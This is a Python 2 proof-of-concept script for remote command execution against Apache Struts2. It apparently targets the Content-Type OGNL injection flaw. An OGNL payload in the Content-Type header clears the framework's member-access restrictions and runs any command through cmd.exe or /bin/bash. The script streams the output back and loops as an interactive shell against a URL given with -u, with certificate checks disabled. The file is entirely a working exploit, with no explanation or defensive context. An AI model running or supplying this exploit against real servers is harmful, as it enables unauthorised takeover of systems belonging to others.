#!/usr/bin/env python
#!encoding:utf-8
#!author:yujun

import urllib2
import sys
import requests
import ssl

def poc(url,command):
    header=dict()
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    poc="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='command').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    poc=poc.replace('command',str(command))
    header['Content-Type']=poc
    context=ssl._create_unverified_context()
    r=requests.get(url,headers=header,stream=True,verify=False) # Set verify=False because some site have ssl error.
    try:
        for chunk in r.iter_content(1024*1024):
            print chunk.decode('GBK').encode('utf-8')
    except:
        pass

def main():
    import getopt
    input_url=''
    opts,args=getopt.getopt(sys.argv[1:],'u:')
    for o,v in opts:
        if o in ('-u'):
            input_url=v
    while True:
        command=raw_input('>')
        poc(input_url,command)

if __name__=='__main__':
    main()

